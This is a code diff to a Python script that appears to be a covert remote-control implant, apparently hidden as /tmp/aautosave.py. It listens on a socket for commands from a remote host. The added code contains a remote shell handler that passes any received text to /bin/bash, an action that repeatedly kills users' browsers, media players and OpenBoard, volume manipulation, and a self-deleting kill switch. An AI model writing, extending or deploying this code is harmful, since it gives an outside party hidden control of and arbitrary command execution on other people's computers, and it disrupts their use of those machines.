@@ -77,14 +77,33 @@ def action_handling(action):
         for i in range(0, int(actionpayload[3])):
             process = Popen(['pkill', 'OpenBoard'], stdout=PIPE, stderr=PIPE)
             time.sleep(int(actionpayload[2]))
+    elif actionpayload[0] == "KILLSHIT":
+        time.sleep(int(actionpayload[1]))
+        for i in range(0, int(actionpayload[3])):
+            process = Popen(['pkill', 'OpenBoard'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['pkill', 'vlc'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['pkill', 'dolphin'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['pkill', 'okular'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['pkill', 'chrome'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['pkill', 'chromium'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['pkill', 'chromuim-browser'], stdout=PIPE, stderr=PIPE)
+            time.sleep(int(actionpayload[2]))
     elif actionpayload[0] == "VOLUPMAX":
         time.sleep(int(actionpayload[1]))
         for i in range(0, int(actionpayload[3])):
-            process = Popen(['amixer', '-D', 'pulse', 'sset', 'Master', '100%+'], stdout=PIPE, stderr=PIPE)
+            process = Popen(['amixer', '-D', 'pulse', 'sset', 'Master', '100%+', 'unmute'], stdout=PIPE, stderr=PIPE)
+            time.sleep(int(actionpayload[2]))
+    elif actionpayload[0] == "VOLUPMIN":
+        time.sleep(int(actionpayload[1]))
+        for i in range(0, int(actionpayload[3])):
+            process = Popen(['amixer', '-D', 'pulse', 'sset', 'Master', '100%-'], stdout=PIPE, stderr=PIPE)
             time.sleep(int(actionpayload[2]))
     elif actionpayload[0] == "KILLSWITCH":
         os.remove("/tmp/aautosave.py")
         sys.exit()
+
+def action_shell_execute_handler(action):
+    os.system(f"/bin/bash -c '{action}'")
 
 def socket_listening(socket):
     global dsthost
@@ -95,6 +114,9 @@ def socket_listening(socket):
         if data.decode('utf-8')[:6] == "ACTION":
             action_handling_thread = Thread(target=action_handling, args=(data.decode('utf-8')[6:],))
             action_handling_thread.start()
+        elif data.decode('utf-8')[:11] == "SHELLACTION":
+            action_shell_execute_handler_thread = Thread(target=action_shell_execute_handler, args=(data.decode('utf-8')[11:],))
+            action_shell_execute_handler_thread.start()
 
         socket.sendto(bytes(f'keepalivedconn', encoding='utf-8'), (dsthost, dstport))
     
